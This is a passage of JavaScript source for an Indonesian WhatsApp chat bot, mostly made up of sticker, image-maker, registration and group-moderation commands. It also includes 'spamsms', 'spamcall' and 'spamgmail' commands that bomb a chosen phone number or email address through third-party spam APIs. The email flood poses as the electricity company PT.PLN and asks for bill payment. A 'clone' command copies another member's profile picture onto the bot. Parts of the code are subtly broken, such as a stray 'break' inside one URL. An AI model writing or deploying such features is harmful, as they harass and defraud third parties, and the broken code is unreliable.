        await limitAdd(sender)
        reply(ind.wait)
        if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
          const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
          filePath = await zaki.downloadAndSaveMediaMessage(encmedia)
          file_name = getRandom('.png')
          file_name2 = getRandom('.webp')
          req({
            url: `https://api.lolhuman.xyz/api/removebg?apikey=${lolKey}`,
            method: 'POST',
            formData: {
              "img": fs.createReadStream(filePath)
            },
            encoding: "binary"
          }, function(error, response, body) {
            fs.unlinkSync(filePath)
            fs.writeFileSync(file_name, body, "binary")
            ffmpeg(`./${file_name}`)
              .input(file_name)
              .on('error', function(err) {
                console.log(err)
                fs.unlinkSync(file_name)
              })
              .on('end', function() {
                zaki.sendMessage(from, fs.readFileSync(file_name2), sticker, {
                  quoted: mek
                })
                fs.unlinkSync(file_name2)
              })
              .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
              .toFormat('webp')
              .save(file_name2)
          });
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
        }
        break                                                   
case 'simi':  
                     if (!isRegister) return reply(mess.only.daftarB)
                     if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} hai sayang`)
                     F = body.slice(10)
                     anu = await fetchJson(`https://pecundang.herokuapp.com/api/simi-id?q=${F}`)
                     anu1 = `${anu.pesan}`
                     reply(anu1)
                     break                                                  
				case 'simih':
					if (!isGroup) return fakeimage(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan fitur')
					if (Number(args[0]) === 1) {
						if (isSimi) return reply('Mode simi sudah aktif')
						samih.push(from)
						fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
						reply('Sukses mengaktifkan mode simi di group ini âœ”ï¸')
					} else if (Number(args[0]) === 0) {
						samih.splice(from, 1)
						fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
						reply('Sukes menonaktifkan mode simi di group ini')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break                                                  
				case 'clone':
					if (!isGroup) return fakeimage(mess.only.group)
					if (!isOwner) return reply(ind.ownerB())
					if (args.length < 1) return reply('Tag target yang ingin di clone')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag cvk')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
					let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
					try {
						pp = await zaki.getProfilePicture(id)
						buffer = await getBuffer(pp)
						zaki.updateProfilePicture(botNumber, buffer)
						mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
					} catch (e) {
						reply('Gagal om')
					}
					break                                                  
		                                
                                
                                case 'katabijak':
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
                                        anu = await fetchJson(`https://pencarikode.xyz/api/katabijak?apikey=pais`, {method: 'get'})
                                        reply(anu.message)
                                        await limitAdd(sender)
                                        break                                                  
                                case 'faktaunik':
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
                                        anu = await fetchJson(`https://arugaz.my.id/api/random/text/faktaunik`, {method: 'get'})
                                        reply(anu.result)
                                        await limitAdd(sender)
                                        break                                                  
                                
                     case 'atm':
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        const kantong = checkATMuser(sender)
                                        reply(ind.uangkau(pushname, sender, kantong))
                                        break                                                  
                                case 'buylimit':
                                        if (args.length < 1) return reply('Berapa limit yang mau di beli kak? Pastiin uang kakak cukup juga kak! \n\nCara cek uang: ${prefix}bal')
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        payout = body.slice(10)
                                        const koinPerlimit = 1000
                                        const total = koinPerlimit * payout
                                        if ( checkATMuser(sender) <= total) return reply(`maaf uang kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
                                        if ( checkATMuser(sender) >= total ) {
                                                confirmATM(sender, total)
                                                bayarLimit(sender, payout)
                                                await reply(`*「 PEMBAYARANBERHASIL 」*\n\n*pengirim* : Admin\n*penerima* : ${pushname}\n*nominal pembelian* : ${payout} \n *harga limit* : ${koinPerlimit}/limit\n *sisa uang mu* : ${checkATMuser(sender)}\n\nproses berhasil dengan nomer pembayaran \n${createSerial(15)}`)
                                        }
                                        break                                                  
                                case 'limit':
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        checkLimit(sender)
                                        break                                                  
                                case 'event':
                                        if (!isGroup) return fakeimage(mess.only.group)
                                        if (!isOwner) return reply(ind.ownerB())
                                        if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
                                        if (Number(args[0]) === 1) {
                                                if (isEventon) return reply('*SUDAH AKTIF* !!!')
                                                event.push(from)
                                                fs.writeFileSync('./database/json/event.json', JSON.stringify(event))
                                                reply('*「 SUCCSESS 」 Mengaktifkan EVENT di group ini*')
                                        } else if (Number(args[0]) === 0) {
                                                event.splice(from, 1)
                                                fs.writeFileSync('./database/json/event.json', JSON.stringify(event))
                                                reply('*「 SUCCSESS 」 Menonaktifkan EVENT di group ini*')
                                        } else {
                                                reply(ind.satukos())
                                        }
                                        break                                                  
       case 'verify':
case 'daftar':
  case 'register':
if (isRegister) return reply('Akun kamu sudah terverfikasi')
const namaUser = `${pushname}`
const umurUser = `${sender}`
const serialUser = createSerial(20)
veri = sender
if (isGroup) {
  addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
  	try {
								ppadd = await zaki.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)

							} catch {
								ppadd = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
  hasil = `\`\`\`「 TERVERIFIKASI 」\`\`\`
\`\`\`│\`\`\`
\`\`\`│❏ Nama : ${namaUser}\`\`\`
\`\`\`│❏ Nomor : wa.me/${sender.split("@")[0]}\`\`\`
\`\`\`│❏ Waktu : ${time}\`\`\`
\`\`\`│❏ SN : ${serialUser}\`\`\`
\`\`\`│❏ User Verified : ${_registered.length}\`\`\`
\`\`\`│\`\`\`
\`\`\`└「 ${botName} 」\`\`\``
let peripi = await getBuffer(ppadd)
zaki.sendMessage(from, peripi, image, {caption: hasil, quoted: mek})
  console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
} else {
  addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
  	try {
								ppadd = await zaki.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)

							} catch {
								ppadd = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
  hasil = `\`\`\`「 TERVERIFIKASI 」\`\`\`
\`\`\`│\`\`\`
\`\`\`│❏ Nama : ${namaUser}\`\`\`
\`\`\`│❏ Nomor : wa.me/${sender.split("@")[0]}\`\`\`
\`\`\`│❏ Waktu : ${time}\`\`\`
\`\`\`│❏ SN : ${serialUser}\`\`\`
\`\`\`│❏ User Verified : ${_registered.length}\`\`\`
\`\`\`│\`\`\`
\`\`\`└「 ${botName} 」\`\`\``
let peripi = await getBuffer(ppadd)
zaki.sendMessage(from, peripi, image, {caption: hasil, quoted: mek})
  console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
}
tm = `\`\`\`「 VERIFIKASI SUKSES 」\`\`\`
\`\`\`Ketik #menu Untuk Melihat Menu\`\`\``
reply(tm)
break                                                  
                                case 'mining':
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (!isEventon) return reply(`maaf ${pushname} event mining tidak di aktifkan oleh owner`)
                                        if (isOwner) {
                                                const one = 999999999
                                                addLevelingXp(sender, one)
                                                addLevelingLevel(sender, 99)
                                                reply(`karena anda owner kami dari team bot mengirim ${one}Xp untuk anda`)
                                        } else {
                                                const mining = Math.ceil(Math.random() * 10000)
                                                addLevelingXp(sender, mining)
                                                await reply(`*selamat* ${pushname} kamu mendapatkan *${mining}Xp*`)
                                        }
                                        break                                                  
                                 case 'setname':
                                        if (!isGroup) return reply(ind.groupo())
			                if (!isGroupAdmins) return reply(mess.only.admin)
			                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                                        zaki.groupUpdateSubject(from, `${body.slice(9)}`)
                                        zaki.sendMessage(from, 'Succes, Ganti Nama Grup', text, {quoted: mek})
				        break                                                  
                                case 'setdesc':
                                        if (!isGroup) return reply(ind.groupo())
			                if (!isGroupAdmins) return reply(mess.only.admin)
			         	if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                                        zaki.groupUpdateDescription(from, `${body.slice(9)}`)
                                        zaki.sendMessage(from, 'Succes, Ganti Deskripsi Grup', text, {quoted: mek})
					break                                                  
                                
                                case 'tagme':
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        var nom = mek.participant
                                        const tagme = {
                                                text: `@${nom.split("@s.whatsapp.net")[0]} Tuh dah ku tag!`,
                                                contextInfo: { mentionedJid: [nom] }
                                        }
                                        zaki.sendMessage(from, tagme, text, {quoted: mek})
                                        break                                                  
                                case 'ip': // masih testing
                                        ipnya = body.slice(3)
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (args.length < 1) return reply(`ip nya mana kak? \nContoh: ${prefix}ip 8.8.8.8`)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
                                        anu = await fetchJson(`https://mnazria.herokuapp.com/api/check?ip=${ipnya}`, {method: 'get'})
                                        lang = anu.location.languages[0]
                                        teks = `〘 *IP* 〙\n  │\n  ╠➥ IP : ${anu.ip} \n  ╠➥ City : ${anu.city} \n  ╠➥ Continent Code : ${anu.continent_code} \n  ╠➥ Continent Name : ${anu.continent_name} \n  ╠➥ Country Code : ${anu.country_code} \n  ╠➥ Country Name : ${anu.country_name} \n ╠➥ Latitude : ${anu.latitude} \n ╠➥ Calling Code : ${anu.location.calling_code} \n ╠➥ Capital : ${anu.location.capital} \n ╠➥ Country Flag : ${anu.location.country_flag} \n ╠➥ Country Flag Emoji : ${anu.location.country_flag_emoji} \n ╠➥ Country Flag Emoji Unicode : ${anu.location.country_flag_emoji_unicode} \n ╠➥ Geoname ID : ${anu.location.geoname_id} \n ╠➥ Languages : ${mekg.code} , ${lang.name} , ${lang.native} \n ╠➥ Longitude : ${anu.longitude} \n ╠➥ Region Code : ${anu.region_code} \n ╠➥ Region Name : ${anu.region_name} \n ╠➥ Type : ${anu.type} \n ╠➥ Zip : ${anu.zip} \n╚═════════════`
                                        zaki.sendMessage(from, teks, text)
                                        await limitAdd(sender)
                                        break                                                  
                     case 'happymod':
                                        toby = body.slice(10)
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (args.length < 1) return reply(`game yang mau di cari apa kak? \nContoh : ${prefix}happymod pubg`)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
                                        anu = await fetchJson(`https://tobz-api.herokuapp.com/api/happymod?q=${toby}&apikey=${apitobz}`, {method: 'get'})
                                        hepi = anu.result[0]
                                        buffer = await getBuffer(hepi.image)
                                        teks = `〘 *HAPPY MOD* 〙\n  ║\n  ╠➥ Title : ${hepi.title} \n  ╠➥ Size : ${hepi.size} \n  ╠➥ Version : ${hepi.version} \n  ╠➥ Root : ${hepi.root} \n ╠➥  Purchase : ${hepi.purchase} \n ╠➥ Price : ${hepi.price} \n  ╠➥ Link : ${hepi.link} \n  ╠➥  Download : ${hepi.download}\n╚═══════`
                                        zaki.sendMessage(from, buffer, image, {quoted: mek, caption: teks})
                                        await limitAdd(sender)
                                        break                                                  
case 'infonomer':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   F = body.slice(11)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/infonomor?no=${F}`)
                   anu1 = `➻ *NOMER* : ${anu.nomor}\n`
                   anu1 += `➻ *JUDUL* : ${anu.op}\n`
                   anu1 += `➻ *JUDUL* : ${anu.international}\n`
                   reply(anu1)
                   break                                                  
                   case 'infogempa':  
                   if (!isRegister) return reply(mess.only.daftarB)	                    
                   anu = await fetchJson(`https://videfikri.com/api/infogempa/`)
                   anu1 = `➻ *WILAYAH* : ${anu.result.wilayah}\n`
                   anu1 += `➻ *BUJUR* : ${anu.result.bujur}\n`
                   anu1 += `➻ *LINTANG* : ${anu.result.lintang}\n`
                   anu1 += `➻ *WAKTU* : ${anu.result.waktu}\n` 
                   anu1 += `➻ *MAGNITUDO* : ${anu.result.magnitudo}\n` 
                   anu1 += `➻ *KEDALAMAN* : ${anu.result.kedalaman}\n` 
                   anu1 += `➻ *MAP* : ${anu.result.map}\n`
                   zaki.sendMessage(from, anu1, text,{quoted: mek})
                   break                                                  
                               
                                case 'say':
                                        teks = body.slice(5)
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (args.length < 1) return reply('teksnya mana kak?')
                                        saying = teks
                                        zaki.sendMessage(from, saying, text)
                                        break                                                  
                                case 'antilinkgroup':
                                	if (!isGroup) return fakeimage(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('anti link group sudah aktif')
						antilink.push(from)
						fs.writeFileSync('./database/json/antilink.json', JSON.stringify(antilink))
						reply('Sukses mengaktifkan anti link group di group ini ✔️')
						zaki.sendMessage(from,`Perhatian kepada seluruh member anti link group aktif apabila anda mengirim link group anda akan di kick dari group`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntilink) return reply('Mode anti link group sudah disable')
						var ini = anti.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./database/json/antilink.json', JSON.stringify(antilink))
						reply('Sukes menonaktifkan anti link group di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break                                                  
         
          case 'antivirtexgroup':

                                	if (!isGroup) return fakeimage(mess.only.group)

					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntivirtex) return reply('anti virtex group sudah aktif')
						antivirtex.push(from)
						fs.writeFileSync('./database/json/antivirtex.json', JSON.stringify(antivirtex))
						reply('Sukses mengaktifkan anti virtex group di group ini ✔️')
						zaki.sendMessage(from,`Perhatian kepada seluruh member anti virtex group aktif apabila anda mengirim virtex atau tag orang group anda akan di kick dari group`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntivirtex) return reply('Mode anti virtex group sudah disable')
						var ini = antivirtex.indexOf(from)
						antivirtex.splice(ini, 1)
						fs.writeFileSync('./database/json/antivirtex.json', JSON.stringify(antivirtex))
						reply('Sukes menonaktifkan anti virtex group di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break                                                  
                                case 'leaderboard':
				case 'lb':
				        bo = args[0]
				        _level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
			         	uang.sort((a, b) => (a.uang < b.uang) ? 1 : -1)
                                        let leaderboardlvl = '「 *LEADERBOARD LEVEL* 」\n\n'
                                        let leaderboarduang = '「 *LEADERBOARD BALANCE* 」\n\n'
                                        nom = 0
                                        try {
                                                for (let i = 0; i < 10; i++) {
                                                        nom++
                                                        leaderboardlvl += `\n  ╠═➥ *「${nom}」*\n  ╠═➥ wa.me/${_level[i].jid.replace('@s.whatsapp.net', '')}\n  ╠═➥ *XP*: ${_level[i].xp}\n  ╠═➥ *Level*: ${_level[i].level}\n`
                                                        leaderboarduang += `\n  ╠═➥ *「${nom}」*\n  ╠═➥ *Number* : wa.me/${uang[i].id.replace('@s.whatsapp.net', '')}\n  ╠═➥ *Balance*: _Rp${uang[i].uang}_\n  ╠═➥ *Limit*: ${limitawal - _limit[i].limit}\n`
                                                }
                                                await reply(leaderboardlvl)
                                                await reply(leaderboarduang)
                                        } catch (err) {
                                                console.error(err)
                                                await reply(`Minimal ${len} user untuk bisa mengakses database`)
                                        }
				        break                                                  
                                case 'antibadwordgroup':
                                        if (!isGroup) return fakeimage(mess.only.group)
                                        if (!isGroupAdmins) return reply(ind.admin())
                                        if (args.length < 1) return reply('Ketik enable untuk mengaktifkan')
                                        if (args[0] === 'enable') {
                                                if (isBadWord) return reply('*fitur BadWord sudah aktif sebelum nya*')
                 	                        badword.push(from)
                 	                        fs.writeFileSync('./database/json/badword.json', JSON.stringify(badword))
                  	                        reply(`*[ Succsess ] mengaktifkan badword di group ini!*`)
                                        } else if (args[0] === 'disable') {
                  	                        badword.splice(from, 1)
                 	                        fs.writeFileSync('./database/json/badword.json', JSON.stringify(badword))
                 	                        reply(`badword is disable`)
             	                        } else {
                 	                        reply(ind.satukos())
                	                }
                                        break                                                  
                                case 'addbadword':
                                        if (!isOwner) return reply(ind.ownerb())
                                        if (!isGroupAdmins) return reply(ind.admin())
                                        if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                                        const bw = body.slice(12)
                                        bad.push(bw)
                                        fs.writeFileSync('./database/json/bad.json', JSON.stringify(bad))
                                        reply('Success Menambahkan Bad Word!')
                                        break                                                  
                                case 'delbadword':
                                        if (!isOwner) return reply(ind.ownerb())
                                        if (!isGroupAdmins) return reply(ind.admin())
                                        if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                                        let dbw = body.slice(12)
                                        bad.splice(dbw)
                                        fs.writeFileSync('./database/json/bad.json', JSON.stringify(bad))
                                        reply('Success Menghapus BAD WORD!')
                                        break                                                   
                                case 'listbadword':
                                        let lbw = `Ini adalah list BAD WORD\nTotal : ${bad.length}\n`
                                        for (let i of bad) {
                                                lbw += `➸ ${i.replace(bad)}\n`
                                        }
                                        await reply(lbw)
                                        break                                                   
                                        case 'moddroid':
				               if (!isRegister) return reply(mess.only.daftarB)
                               if (isBanned) return reply(mess.only.benned)  
                               if (isLimit(sender)) return reply(ind.limitend(pushname))
			data = await fetchJson(`https://tobz-api.herokuapp.com/api/moddroid?q=${body.slice(10)}&apikey=${apitobz}`)
			hepi = data.result[0] 
			teks = `*Nama*: ${data.result[0].title}\n*publisher*: ${hepi.publisher}\n*mod info:* ${hepi.mod_info}\n*size*: ${hepi.size}\n*latest version*: ${hepi.latest_version}\n*genre*: ${hepi.genre}\n*link:* ${hepi.link}\n*download*: ${hepi.download}`
			buffer = await getBuffer(hepi.image)
			zaki.sendMessage(from, buffer, image, {quoted: mek, caption: `${teks}`})
			await limitAdd(sender)
			break                                                  

			case 'ssweb':
                if (!isRegister) return reply(mess.only.daftarB)
                    if (isLimit(sender)) return reply(ind.limitend(pushname))
					if (args.length < 1) return reply('Urlnya mana om')
					teks = body.slice(7)
					reply(ind.wait)
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/screenshotweb?url=${teks}`)
					buff = await getBuffer(anu.gambar)
					zaki.sendMessage(from, buff, image, {quoted: mek})
					await limitAdd(sender)
					break                                                  

					case 'tahta':
				if (!isRegister) return reply(mess.only.daftarB)
				if (args.length < 1) return reply('Teksnya mana kak? >.<')
					teks = body.slice(7)
					if (teks.length > 9) return reply('Teksnya kepanjangan, maksimal 9 karakter')
					reply (mess.wait)
					buffer = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${teks}&apikey=${apizeks}`)
					zaki.sendMessage(from, buffer, image, {quoted:  { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { mimetype: "image/jpeg", "caption": ` *Harta Tahta ${teks}*`, "jpegThumbnail": fs.readFileSync('./temp/image/tahta.jpeg') } } } } )
					break    
					
						case 'kannagen':
				if (!isRegister) return reply(mess.only.daftarB)
				if (args.length < 1) return reply('Teksnya mana kak? >.<')
					teks = body.slice(7)
					if (teks.length > 9) return reply('Teksnya kepanjangan, maksimal 9 karakter')
					reply (mess.wait)
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/creator/kannagen?apikey=${lolKey}&text=${teks}`)
					zaki.sendMessage(from, buffer, image, {quoted: mek} )
					break
					
					
case 'spamsms':

                  if (!isRegister) return reply(mess.only.daftarB)
                  
                  if (isLimit(sender)) return reply(ind.limitend(pushname))

				reply(ind.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} 08303030303030`)
                    nomor = args[0]
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam1?apikey=${lolKey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam2?apikey=${lolKey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam3?apikey=${lolKey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam4?apikey=${lolKey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam5?apikey=${lolKey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam6?apikey=${lolKey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam7?apikey=${lolKey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam8?apikey=${lolKey}&nomor=${nomor}`)
                    reply("Success")
                    break                                                  
		case 'spamcall':
			if (!isRegister) return reply(mess.only.daftarB)
			if (isLimit(sender)) return reply(ind.limitend(pushname))
			call = `${body.slice(11)}`
			anu = await fetchJson(`http://docs-jojo.herokuapp.com/api/spamcall?no=${call}`, {method: 'get'})
			zaki.sendMessage(from, `${anu.logs}`, text, {quoted: mek})
			await limitAdd(sender) 
			break                                                    
		case 'spamgmail':
			if (!isRegister) return reply(mess.only.daftarB)
			if (isLimit(sender)) return reply(ind.limitend(pushname))
			spam = `${body.slice(10)}`
			anu = await fetchJson(`https://videfikri.com/api/spamemail/?email=${spam}&subjek=PT.PLN&pesan=Silahkan%20bayar%20tagihan%20listrik%20Anda`, {method: 'get'})
			zaki.sendMessage(from, `${anu.result.log_lengkap}`, text, {quoted: mek})
			await limitAdd(sender) 
			break                                                    
		
                   case 'rainbow':  
                    if (!isRegister) return reply(mess.only.daftarB)
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zaki*`)
                   F = body.slice(9)
                   reply (mess.wait)
                   anu = await getBuffer(`https://api-rull.herokuapp.com/api/Photooxy/rainbowshine?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                                                  
//MAKERMENU
case 'imgmaker':

        if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))

        
        if (args.length < 1) return reply('Url png/jpg mana kak')
        ainez = body.slice(10)
        reply(ind.wait())
        anu = await fetchJson(`http://lolhuman.herokuapp.com/api/quotemaker?apikey=${lolKey}&text=${ainez}`, {
          method: 'get'
        })
        buffer = await getBuffer(anu.result)
        zaki.sendMessage(from, buffer, image, {
          caption: 'Nih kak udah jadi..',
          quoted: mek
        })
        await limitAdd(sender)
        break                                                  
case 'galaxtext':

        if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))

        
        if (args.length < 1) return reply(ind.wrongf())
        ct = body.slice(10)
        reply(ind.wait())
        ct = await getBuffer(`http://lolhuman.herokuapp.com/api/ephoto1/galaxywallpaper?apikey=${lolKey}&text=${ct}`)
        zaki.sendMessage(from, ct, image, {
          caption: 'Nih kak udah jadi..',
          quoted: mek
        })
        await limitAdd(sender)
        break                                                  
case 'calendermaker':

        if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        
        if (args.length < 1) return reply('Url png/jpg mana kak')
        ainez2 = body.slice(15)
        reply(ind.wait())
        anu = await fetchJson(`https://api.zeks.xyz/api/calendar?img=${ainez2}&apikey=${zeksKey}`, {
          method: 'get'
        })
        buffer = await getBuffer(anu.result)
        zaki.sendMessage(from, buffer, image, {
          caption: 'Nih kak udah jadi..',
          quoted: mek
        })
        await limitAdd(sender)
        break                                                  
case 'neon2':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zaki*`)
                   F = body.slice(7)
                   reply (mess.wait)
                   anu = await getBuffer(`https://api.zeks.xyz/api/bneon?apikey=${apizeks}&text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                                                                      
                   case 'wall':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zaki*`)
                   F = body.slice(6)
                   reply (mess.wait)
                   anu = await getBuffer(`https://api.zeks.xyz/api/break                                                  wall?apikey=${apizeks}&text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                                                     
                   case 'wolf':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zaki*`)
                   F = body.slice(6)
                   reply (mess.wait)
                   anu = await getBuffer(`https://api.zeks.xyz/api/wolflogo?apikey=${apizeks}&text1=rimurubotz&text2=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                                                   
                   case 'tfire':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zaki*`)
                   F = body.slice(7)
                   reply (mess.wait)
                   anu = await getBuffer(`https://api.zeks.xyz/api/tfire?text=${F}&apikey=${apizeks}`)                   
                   zaki.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                                                                  
                   case 'ytgold':  
                   if (!isRegister) return reply(mess.only.daftarB)	
		            
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zaki*`)
                   F = body.slice(8)
                   reply (mess.wait)
                   anu = await getBuffer(`https://api.zeks.xyz/api/gplaybutton?text=${F}&apikey=${apizeks}`)
                   zaki.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                                                  
                   case 'ytsilver':  
                   if (!isRegister) return reply(mess.only.daftarB)	
		            
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zaki*`)
                   F = body.slice(10)
                   reply (mess.wait)
                   anu = await getBuffer(`https://api.zeks.xyz/api/splaybutton?text=${F}&apikey=${apizeks}`)
                   zaki.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                                                  
                   case 't3d':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zaki*`)
                   F = body.slice(5)
                   reply (mess.wait)
                   anu = await getBuffer(`https://api.zeks.xyz/api/text3dbox?apikey=${apizeks}&text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                                                  
                   case 'logoa':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zaki&chan*`)
                   var F = body.slice(7)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply (mess.wait)
                   anu = await getBuffer(`https://api.zeks.xyz/api/logoaveng?text1=${F1}&text2=${F2}&apikey=${apizeks}`)
                   zaki.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                                                  
                   case 'pornhub':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zaki&chan*`)
                   var F = body.slice(9)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply (mess.wait)
                   anu = await getBuffer(`https://api.zeks.xyz/api/phlogo?text1=${F1}&text2=${F2}&apikey=${apizeks}`)
                   zaki.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                                                  
                   case 'marvel':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zaki&chan*`)
                   var F = body.slice(8)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply (mess.wait)
                   anu = await getBuffer(`https://api.zeks.xyz/api/marvellogo?text1=${F1}&text2=${F2}&apikey=${apizeks}`)
                   zaki.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                                                  
                   case 'leavest':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zaki*`)
                   F = body.slice(9)
                   reply (mess.wait)
                   anu = await getBuffer(`https://api.zeks.xyz/api/leavest?text=${F}&apikey=${apizeks}`)
                   zaki.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                                                                      
                   case 'phcoment':  
                   if (!isRegister) return reply(mess.only.daftarB)	
		            
